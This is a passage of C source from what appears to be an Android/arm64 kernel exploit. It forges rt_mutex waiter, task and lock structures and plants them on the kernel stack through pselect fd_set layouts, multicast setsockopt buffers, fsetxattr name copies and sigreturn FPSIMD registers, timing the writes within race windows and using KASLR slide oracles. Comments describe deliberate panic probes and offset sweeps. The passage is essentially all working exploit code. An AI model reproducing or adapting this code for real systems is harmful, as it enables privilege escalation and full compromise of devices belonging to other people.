    {5, stack_pi_left, "pi_left"},
#else
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, slide_oracle_parent, "pi_pc"},
    {4, 0, "pi_right"},
    {5, slide_oracle_target, "pi_left"},
#endif
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi_pc"},
    {4, 0, "pi_right"},
    {5, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi_left"},
#endif
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
    defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    {6, stack_task, "task"},
#else
    {6, fake_task, "task"},
#endif
#else
    {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {7, fake_lock, "lock"},
#if COMPACT_RT_MUTEX_WAITER
    {8, ((uint64_t)(uint32_t)ACTIVE_PSELECT_WAITER_PRIO << 32) |
            (uint32_t)SLIDE_WAITER_WAKE_STATE,
     "wake_state+prio"},
#else
    {8, ACTIVE_PSELECT_WAITER_PRIO, "prio"},
#endif
    {9, 0, "deadline"},
#if COMPACT_RT_MUTEX_WAITER
    {10, 0, "ww_ctx"},
#endif
#else
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    {0, slide_oracle_parent, "tree_pc"},
    {1, 0, "tree_right"},
    {2, slide_oracle_target, "tree_left"},
    {3, ACTIVE_PSELECT_WAITER_PRIO, "tree_prio"},
    {5, slide_oracle_parent, "pi0"},
    {6, 0, "pi1"},
    {7, slide_oracle_target, "pi2"},
#else
    {0, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "tree_pc"},
    {1, 0, "tree_right"},
    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
    {3, ACTIVE_PSELECT_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset, "pi0"},
    {6, 0, "pi1"},
    {7, SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset, "pi2"},
#endif
    {8, ACTIVE_PSELECT_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {10, fake_task, "task"},
#else
    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
#endif
    {11, fake_lock, "lock"},
#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
    {12, 0, "wake_state"},
#else
    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
#endif
    {13, 0, "ww_ctx"},
#endif
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
#if defined(O1S_PI_STAMP_FIX) && O1S_PI_STAMP_FIX
  /* TEMP-TEST v8 (corrected direction, verified 3x): out-byte b lands at
   * waiter+(0x48-b) (NFDS=640). Partial plot: only these fds matter.
   * lock[0x38] <- fds 72-135; task[0x30] <- fds 136-191;
   * pi_parent[0x18] <- fds 328-383 (zero); prio[0x40] <- fds 40-63. */
  {
    struct { unsigned off; uint64_t val; unsigned sz; } fields[] = {
      {0x18, 0, 8},
      {0x20, 0, 8},
      {0x28, 0, 8},
      {0x30, 0, 8},
      {0x38, 0, 8},
      {0x40, FAKE_WAITER_PRIO, 4},
    };
    uint64_t taskv = fake_task, lockv = fake_lock;
#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
    /* TEMP-TEST hit-probe: lock slotina zehirli VA bas; walk sirasinda
     * VA=0x0badf00d... Oops = STAMP VURDU (hit+direction kaniti); temiz
     * kosu = MISS (derinlik/yon yanlis). Panic ISTENIYOR (kanit icin). */
    lockv = 0x0badf00d0badf00dULL;
#endif
    memcpy(&fields[3].val, &taskv, 8);
    memcpy(&fields[4].val, &lockv, 8);
    for (unsigned fi = 0; fi < sizeof(fields) / sizeof(fields[0]); fi++) {
      for (unsigned i = 0; i < fields[fi].sz; i++) {
        uint8_t byte = (uint8_t)(fields[fi].val >> (8 * i));
        unsigned b = 0x48 - (fields[fi].off + i);
        for (unsigned j = 0; j < 8; j++) {
          if (byte & (1u << j)) {
            unsigned fd = 8 * b + j;
            if (fd < (unsigned)slide_route_nfds)
              FD_SET((int)fd, out);
          }
        }
      }
    }
  }
#endif
}

RMG_RACE_INLINE void open_slide_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < slide_route_nfds; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
}
#endif

static void slide_reset_consume_state(void) {
  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_seen, 0);
  atomic_store(&slide_consume_lost, 0);
  atomic_store(&slide_consume_enter_sched, 0);
  atomic_store(&slide_consume_calls, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_last_sched_ret, -1);
  atomic_store(&slide_consume_last_sched_errno, 0);
  atomic_store(&slide_stack_write_window, 0);
  atomic_store(&slide_pselect_write_window, 0);
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
  atomic_store(&slide_pselect_last_ret, INT_MIN);
  atomic_store(&slide_pselect_last_errno, 0);
  atomic_store(&slide_pselect_last_elapsed_usec, 0);
#endif
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION) || \
    (defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
  atomic_store(&slide_pselect_started_ns, 0);
#endif
}

#if defined(SLIDE_STACK_WRITER)
static void slide_build_fake_waiter(unsigned char *payload,
                                    size_t waiter_off) {
  uintptr_t tree_parent = slide_oracle_parent;
  uintptr_t tree_right = 0;
  uintptr_t tree_left = slide_oracle_target;
  uintptr_t pi_parent = slide_oracle_parent;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = slide_oracle_target;

#if defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
  if (slide_oracle_parent == fake_fops &&
      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
    tree_right = slide_oracle_target;
    tree_left = 0;
    pi_parent = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF;
    pi_right = 0;
    pi_left = 0;
  }
#endif

  memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
  put_fake_waiter(payload, waiter_off,
                  tree_parent, tree_right, tree_left,
                  pi_parent, pi_right, pi_left,
                  fake_task, fake_lock, FAKE_WAITER_PRIO);
}
#endif

#if !defined(SLIDE_STACK_WRITER)
RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, slide_route_nfds + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
  /* TEMP-TEST: early-fire ayni attempt'te stamp+walk'i yaptiysa onun
   * sched_ok muhasebesini koru (consume-once flag = per-attempt reset). */
  if (atomic_exchange(&slide_early_fired, 0) == 0)
    slide_reset_consume_state();
#else
  slide_reset_consume_state();
#endif

  struct timespec timeout = {
#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
    .tv_sec = 0,
    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
#else
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
#endif
  };
  struct timespec *timeoutp = &timeout;

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  atomic_store(&slide_consume_go, 1);
  /*
   * The reference waiter publishes the route sequence and then enters
   * pselect without waiting for the consumer's acknowledgement.  The
   * consumer observes this sequence first and waits for the timestamp below.
   */
#endif
  size_t pselect_started = gettime_ns();
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION) || \
    (defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
  atomic_store(&slide_pselect_started_ns, pselect_started);
#endif
  for (int index = 0; index < slide_route_syscall_pad; index++) {
    syscall(SYS_gettid);
  }
#if !(defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE)
  atomic_store(&slide_consume_go, 1);
#endif
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
                         &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  size_t pselect_elapsed_usec =
      (gettime_ns() - pselect_started) / 1000ULL;
#if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
  atomic_store(&slide_pselect_last_ret, ret);
  atomic_store(&slide_pselect_last_errno, saved_errno);
  atomic_store(&slide_pselect_last_elapsed_usec, pselect_elapsed_usec);
#endif
  atomic_store(&slide_consume_go, 0);

  if (atomic_load(&slide_consume_enter_sched) != 0 &&
      !atomic_load(&slide_consume_stop)) {
    size_t consume_deadline = gettime_ns() + 200000000ULL;
    while (!atomic_load(&slide_consume_stop) &&
           gettime_ns() < consume_deadline) {
      usleep(1000);
    }
  }

#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
  (void)saved_errno;
  (void)pselect_elapsed_usec;
#elif defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("slide pselect returned nfds=%d pad=%d prod_stack=%d "
          "ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_route_nfds, slide_route_syscall_pad,
          slide_pselect_production_stack, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#else
  pr_info("slide pselect returned nfds=%d pad=%d ret=%d errno=%d "
          "elapsed_usec=%zu "
          "ready=%d seen=%d entered=%d calls=%d sched_ok=%d "
          "last_sched_ret=%d last_sched_errno=%d\n",
          slide_route_nfds, slide_route_syscall_pad, ret, saved_errno,
          pselect_elapsed_usec,
          atomic_load(&slide_consumer_ready),
          atomic_load(&slide_consume_seen),
          atomic_load(&slide_consume_enter_sched),
          atomic_load(&slide_consume_calls),
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
#endif
  atomic_store(&slide_stack_write_window,
               ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}
#endif /* !defined(SLIDE_STACK_WRITER) */

#if defined(O1S_EARLY_FIRE) && O1S_EARLY_FIRE
/* TEMP-TEST early-stamp (slide_pselect_stack_copy'nin handshake'siz kopyasi):
 * go/stop/reset atomiklerine DOKUNMAZ; sadece fd-pstudy + pselect(100ms).
 * Consumer tarafindan PI-block penceresi icinde cagrilir. */

static int slide_pselect_early_stamp(int *errno_out) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide early-stamp missing base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    if (errno_out)
      *errno_out = ENXIO;
    return -1;
  }
  int pipefd[2] = {-1, -1};
  if (pipe(pipefd) != 0) {
    if (errno_out)
      *errno_out = errno;
    return -1;
  }
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0)
    block_fd = pipefd[0];
  int high_read = fcntl(block_fd, F_DUPFD, slide_route_nfds + 16);
  if (high_read < 0) {
    int e = errno;
    if (block_fd != pipefd[0])
      close(block_fd);
    close(pipefd[0]);
    close(pipefd[1]);
    if (errno_out)
      *errno_out = e;
    return -1;
  }
  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);
  struct timespec timeout = {
#ifdef SLIDE_PSELECT_TIMEOUT_NSEC
    .tv_sec = 0,
    .tv_nsec = SLIDE_PSELECT_TIMEOUT_NSEC,
#else
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
#endif
  };
  size_t t0 = gettime_ns();
  errno = 0;
  int ret = (int)syscall(SYS_pselect6, slide_route_nfds,
                         &in, &out, &ex, &timeout, NULL);
  int e = errno;
  size_t el = (gettime_ns() - t0) / 1000ULL;
  pr_info_sync("slide early-stamp pselect ret=%d errno=%d elapsed_usec=%zu\n",
               ret, e, el);
  close(high_read);
  if (block_fd != pipefd[0])
    close(block_fd);
  close(pipefd[0]);
  close(pipefd[1]);
  if (errno_out)
    *errno_out = e;
  return ret;
}
#endif

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
#ifndef SLIDE_MCAST_DOMAIN
#define SLIDE_MCAST_DOMAIN AF_INET6
#endif
#ifndef SLIDE_MCAST_LEVEL
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#endif
#ifndef SLIDE_MCAST_OPTION
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#endif
static void slide_mcast_stack_copy(void) {
  enum { stamp_size = 0x108 };
  /* Runtime sweep support: SLIDE_MCAST_OFF (hex) overrides the build-time
   * MCAST_WAITER_OFF so the plant offset can be swept without rebuilding. */
  unsigned long mcast_off = (unsigned long)MCAST_WAITER_OFF;
  {
    const char *env = getenv("SLIDE_MCAST_OFF");
    if (env && *env) {
      char *end = NULL;
      errno = 0;
      unsigned long v = strtoul(env, &end, 0);
      if (!errno && end != env && !*end &&
          v + FAKE_WAITER_LAYOUT_SIZE <= stamp_size) {
        mcast_off = v;
      } else {
        pr_warning("slide mcast bad SLIDE_MCAST_OFF=%s, using %#lx\n", env,
                   mcast_off);
      }
    }
  }
  _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
                 "MCAST waiter must fit in the copied stack stamp");
  unsigned char stamp[stamp_size];
  memset(stamp, 0, sizeof(stamp));
  uint16_t invalid_family = AF_UNSPEC;
  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
  slide_build_fake_waiter(stamp, (int)mcast_off);

  int fd = socket(SLIDE_MCAST_DOMAIN, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    pr_error("slide mcast socket errno=%d\n", errno);
    return;
  }

  slide_reset_consume_state();

  errno = 0;
  int ret = setsockopt(fd, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
                       stamp, sizeof(stamp));
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 1);
  while (!atomic_load(&slide_consume_stop))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&slide_consume_go, 0);

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
  pr_info("slide mcast returned domain=%d level=%d option=%d "
          "offset=%#lx ret=%d errno=%d "
          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
          SLIDE_MCAST_DOMAIN, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
          mcast_off, ret, saved_errno,
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
  close(fd);
}
#endif

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_XATTR) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_XATTR
/* XATTR plant: fsetxattr name kopyasi (256B, NUL'suz desen) kernel stack'e
 * sp+0x8'e iner; zincir entry-0x50-0x150 → hedef entry-0x198 (slot).
 * Kopya validasyondan ONCE oldugundan fd tipi/izin farketmez (EOPNOTSUPP
 * sonrasi bile plant durur). Desen: benzersiz 8'li pencereler, fault VA
 * dogrudan file offset'i decode eder. */
static const unsigned char xattr_pat[256] = {
  0xac, 0x84, 0x9f, 0xed, 0xb0, 0xcc, 0xf8, 0xe8, 0xec, 0xd4, 0xa9, 0xec, 0xef, 0xce, 0x99, 0xd8,
  0x9d, 0xd7, 0xa7, 0xbf, 0xed, 0x91, 0xa2, 0xb3, 0xe0, 0xfa, 0xef, 0xaf, 0xad, 0xca, 0x87, 0x91,
  0xc2, 0xba, 0xe6, 0xb3, 0x9a, 0xc7, 0xd6, 0x81, 0x8b, 0x91, 0x9b, 0xbd, 0xd5, 0xb5, 0x9a, 0xa1,
  0xd3, 0x9e, 0xc3, 0x9d, 0xc3, 0xb5, 0x9a, 0xe4, 0xf6, 0x83, 0xd2, 0xf0, 0xe3, 0xf6, 0xce, 0xa9,
  0xc4, 0xd2, 0xf9, 0xfa, 0x9c, 0x8b, 0xb1, 0xed, 0xec, 0xf5, 0x9e, 0xd5, 0xbf, 0x8d, 0xa2, 0xe9,
  0xaa, 0xea, 0x89, 0xbf, 0xe0, 0xe1, 0xf4, 0xc9, 0xbd, 0x88, 0x9d, 0xbd, 0x92, 0xda, 0xbe, 0xe5,
  0xa7, 0xe0, 0xe1, 0xf8, 0x9c, 0xb4, 0xda, 0xeb, 0x87, 0xee, 0xd4, 0xba, 0x8a, 0x90, 0xd0, 0xbe,
  0x91, 0xbb, 0x9b, 0xe4, 0xdf, 0xda, 0xab, 0xa9, 0xf9, 0xd6, 0xb9, 0x83, 0x9a, 0xe4, 0xa1, 0x88,
  0x97, 0xa7, 0xe2, 0xcd, 0x82, 0x91, 0xef, 0xeb, 0x9d, 0xf2, 0xd1, 0xd1, 0x9d, 0x8b, 0xad, 0xd7,
  0xe7, 0xac, 0xa5, 0xa9, 0x9a, 0xf3, 0xcf, 0xf5, 0xbe, 0xe8, 0xcd, 0xb9, 0xd7, 0x9f, 0xaa, 0x9d,
  0xbf, 0x94, 0xce, 0xfa, 0x9a, 0x97, 0xd6, 0x9b, 0xb6, 0x80, 0xa2, 0xe5, 0xf0, 0xe2, 0xa7, 0xd0,
  0xf8, 0xa0, 0x90, 0xa1, 0xf9, 0x8c, 0xfc, 0xd2, 0x91, 0xea, 0xd5, 0xa6, 0xb3, 0xb5, 0xbe, 0xa2,
  0xd7, 0xbe, 0xc0, 0xb3, 0xaf, 0xcc, 0xb2, 0xab, 0xe2, 0xb4, 0xf8, 0xec, 0xb1, 0xa7, 0xd7, 0xb3,
  0xa1, 0xc9, 0xbf, 0xbc, 0xce, 0x81, 0x8b, 0xe3, 0x8a, 0xa0, 0x95, 0xbe, 0x81, 0xbb, 0xe7, 0x85,
  0x95, 0xa6, 0x8c, 0x83, 0xb1, 0xe7, 0xbf, 0x95, 0xca, 0xe5, 0xfb, 0x80, 0xe4, 0xf9, 0xcb, 0x91,
  0x8d, 0xcc, 0xbc, 0xdb, 0xab, 0xbd, 0xcc, 0xa4, 0x92, 0x8f, 0x93, 0x8e, 0xe7, 0xae, 0xe1, 0xdd,
};

static void slide_fsetxattr_stack_copy(void) {
  int fd = open_ashmem_device();
  if (fd < 0) {
    pr_error("slide xattr open errno=%d\n", errno);
    return;
  }

  slide_reset_consume_state();

  errno = 0;
  long ret =
      syscall(SYS_fsetxattr, fd, (const char *)xattr_pat, NULL, 0, 0);
  int saved_errno = errno;
  /* NOT: close() ve log handshake SONRASINA (plant-walk arasi sifir syscall).
   * close (ashmem_release) ve write log frame'leri plant bolgesine inebilir. */
  atomic_store(&slide_consume_go, 1);
  while (!atomic_load(&slide_consume_stop))
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&slide_consume_go, 0);
  close(fd);
  pr_info("slide xattr_copy_done=1 ret=%ld errno=%d\n", ret, saved_errno);

  int sched_ok = atomic_load(&slide_consume_sched_ok);
  atomic_store(&slide_stack_write_window,
               sched_ok > 0);
  pr_info("slide xattr returned calls=%d sched_ok=%d last_sched_ret=%d "
          "last_sched_errno=%d\n",
          atomic_load(&slide_consume_calls), sched_ok,
          atomic_load(&slide_consume_last_sched_ret),
          atomic_load(&slide_consume_last_sched_errno));
}
#endif

#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
static atomic_int slide_sigreturn_done;
static atomic_int slide_sigreturn_status;
static atomic_int slide_sigreturn_found_fpsimd;
static atomic_int slide_sigreturn_found_sve;
static atomic_int slide_sigreturn_waiter_off;
static atomic_int slide_sigreturn_probe_only;
#define SLIDE_SIGRETURN_RECORD_MAX 16
static atomic_int slide_sigreturn_record_count;
static atomic_int slide_sigreturn_record_magic[SLIDE_SIGRETURN_RECORD_MAX];
static atomic_int slide_sigreturn_record_size[SLIDE_SIGRETURN_RECORD_MAX];
static atomic_int slide_sigreturn_record_area[SLIDE_SIGRETURN_RECORD_MAX];
static unsigned char slide_sigreturn_payload_fpsimd[0x200];
static unsigned char slide_sigreturn_payload_sve[0x200];
static atomic_uint_fast64_t slide_sigreturn_vregs_addr;
static atomic_uint_fast64_t slide_sigreturn_verify_lock;
static atomic_uint_fast64_t slide_sigreturn_verify_task;
static volatile sig_atomic_t slide_fpu_trapped;
/* Runtime waiter-offset override (SLIDE_SIG_OFF hex); -1 = build default.
 * Lets the plant position be swept without rebuilding. Read lazily so
 * fill paths running before stack_copy still see it. */
static int slide_sig_off_override = -2; /* -2 = unread */
static int slide_sig_off_read(void) {
  if (slide_sig_off_override == -2) {
    slide_sig_off_override = -1;
    const char *env = getenv("SLIDE_SIG_OFF");
    if (env && *env) {
      char *end = NULL;
      errno = 0;
      unsigned long v = strtoul(env, &end, 0);
      if (!errno && end != env && !*end &&
          v + FAKE_WAITER_LAYOUT_SIZE <= 0x200)
        slide_sig_off_override = (int)v;
    }
  }
  return slide_sig_off_override;
}
static int slide_sig_off_fpsimd(void) {
  int o = slide_sig_off_read();
  if (o >= 0)
    return o;
  return SIGRETURN_FPSIMD_WAITER_OFF;
}
static int slide_sig_off_sve(void) {
  int o = slide_sig_off_read();
  if (o >= 0)
    return o;
  return SIGRETURN_SVE_WAITER_OFF;
}
/* Logger-thread exfiltration: the waiter thread must make NO syscalls
 * between plant (handler-return copy) and walk (S22U §4f). FPU readback
 * values are stashed here; a sibling thread (own stack) prints them, so
 * observing never clobbers. */
static uint64_t slide_fpu_log[6];
static atomic_int slide_fpu_log_ready;
static void *slide_fpu_logger_thread(void *arg) {
  (void)arg;
  while (!atomic_load(&slide_fpu_log_ready))
    usleep(1000);
  pr_info("slide fpu24=%016llx/%016llx fpu0=%016llx/%016llx off=%#llx (logger)\n",
          (unsigned long long)slide_fpu_log[0],
          (unsigned long long)slide_fpu_log[1],
          (unsigned long long)slide_fpu_log[2],
          (unsigned long long)slide_fpu_log[3],
          (unsigned long long)slide_fpu_log[4]);
  fsync(STDOUT_FILENO);
  return NULL;
}

static void slide_sigill_handler(int signal_number) {
  (void)signal_number;
  slide_fpu_trapped = 1;
}

_Static_assert(ATOMIC_INT_LOCK_FREE == 2,
               "signal handler atomics must be lock-free");
_Static_assert(sizeof(struct fpsimd_context) == 0x210,
               "unexpected arm64 FPSIMD context size");
_Static_assert(sizeof(((struct fpsimd_context *)0)->vregs) == 0x200,
               "unexpected arm64 FPSIMD register payload size");
_Static_assert(SIGRETURN_SVE_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
               "fake waiter must fit in FPSIMD registers");

static int slide_sigreturn_scan_records(
    unsigned char *cursor, size_t bytes, int area,
    struct fpsimd_context **fpsimd, int *saw_sve,
    unsigned char **extra_data, size_t *extra_bytes) {
  unsigned char *end = cursor + bytes;
  while ((size_t)(end - cursor) >= sizeof(struct _aarch64_ctx)) {
    struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;
    if (header->magic == 0 && header->size == 0) {
      return 1;
    }
    int record = atomic_load_explicit(&slide_sigreturn_record_count,
                                      memory_order_relaxed);
    if (record < SLIDE_SIGRETURN_RECORD_MAX) {
      atomic_store_explicit(&slide_sigreturn_record_magic[record],
                            (int)header->magic, memory_order_relaxed);
      atomic_store_explicit(&slide_sigreturn_record_size[record],
                            (int)header->size, memory_order_relaxed);
      atomic_store_explicit(&slide_sigreturn_record_area[record], area,
                            memory_order_relaxed);
      atomic_store_explicit(&slide_sigreturn_record_count, record + 1,
                            memory_order_relaxed);
    }
    if (header->size < sizeof(*header) || (header->size & 15) != 0 ||
        (size_t)(end - cursor) < header->size) {
      return 0;
    }
    if (header->magic == FPSIMD_MAGIC) {
      if (header->size < sizeof(struct fpsimd_context)) {
        return 0;
      }
      *fpsimd = (struct fpsimd_context *)header;
    } else if (header->magic == SVE_MAGIC) {
      *saw_sve = 1;
    } else if (header->magic == EXTRA_MAGIC &&
               header->size >= sizeof(struct extra_context)) {
      struct extra_context *extra = (struct extra_context *)header;
      if (extra->datap && extra->size >= sizeof(struct _aarch64_ctx) &&
          extra->size <= 65536) {
        *extra_data = (unsigned char *)(uintptr_t)extra->datap;
        *extra_bytes = extra->size;
      }
    }
    cursor += header->size;
  }
  return 0;
}

static void slide_sigreturn_handler(int signal_number,
                                    siginfo_t *signal_info,
                                    void *user_context) {
  (void)signal_number;
  (void)signal_info;
  ucontext_t *context = user_context;
  unsigned char *cursor = context->uc_mcontext.__reserved;
  struct fpsimd_context *fpsimd = NULL;
  unsigned char *extra_data = NULL;
  size_t extra_bytes = 0;
  int saw_sve = 0;
  int status = -3;

  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_sve, 0,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_record_count, 0,
                        memory_order_relaxed);

  if (!slide_sigreturn_scan_records(
          cursor, sizeof(context->uc_mcontext.__reserved), 0,
          &fpsimd, &saw_sve, &extra_data, &extra_bytes)) {
    status = -2;
    goto done;
  }
  if (extra_data &&
      !slide_sigreturn_scan_records(extra_data, extra_bytes, 1,
                                    &fpsimd, &saw_sve,
                                    &extra_data, &extra_bytes)) {
    status = -6;
    goto done;
  }

  if (fpsimd == NULL) {
    goto done;
  }

  size_t waiter_off = saw_sve ? (size_t)slide_sig_off_sve()
                              : (size_t)slide_sig_off_fpsimd();
  if (waiter_off + FAKE_WAITER_LAYOUT_SIZE >
      sizeof(fpsimd->vregs)) {
    status = -5;
    goto done;
  }

  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 1,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_found_sve, saw_sve,
                        memory_order_relaxed);
  atomic_store_explicit(&slide_sigreturn_waiter_off, (int)waiter_off,
                        memory_order_relaxed);

  if (atomic_load_explicit(&slide_sigreturn_probe_only,
                           memory_order_relaxed)) {
    status = 1;
    goto done;
  }

  volatile unsigned char *destination =
      (volatile unsigned char *)fpsimd->vregs;
  const unsigned char *source = saw_sve ? slide_sigreturn_payload_sve
                                        : slide_sigreturn_payload_fpsimd;
  for (size_t index = 0;
       index < sizeof(slide_sigreturn_payload_fpsimd); index++) {
    destination[index] = source[index];
  }
#if defined(SLIDE_SIGRETURN_GRADIENT)
  /* Ikinci pencere: uc_sigmask kernel tarafinda ayri bir stack lokaline
   * kopyalanir (derinlik bilinmiyor). Fault 0x4343... ise bu pencere vurdu.
   * KILL/STOP maskelenemez, walk sonrasi sinyal gerekmiyor. Guvenli. */
  memset(&context->uc_sigmask, 0x43, sizeof(context->uc_sigmask));
#endif

  atomic_store_explicit(&slide_sigreturn_vregs_addr,
                        (uintptr_t)fpsimd->vregs, memory_order_relaxed);
  uint64_t readback_lock = 0;
  uint64_t readback_task = 0;
  const unsigned char *readback = (const unsigned char *)fpsimd->vregs;
  for (size_t b = 0; b < sizeof(readback_lock); b++) {
    ((unsigned char *)&readback_lock)[b] =
        readback[waiter_off + FAKE_WAITER_LOCK_OFF + b];
  }
  for (size_t b = 0; b < sizeof(readback_task); b++) {
    ((unsigned char *)&readback_task)[b] =
        readback[waiter_off + FAKE_WAITER_TASK_OFF + b];
  }
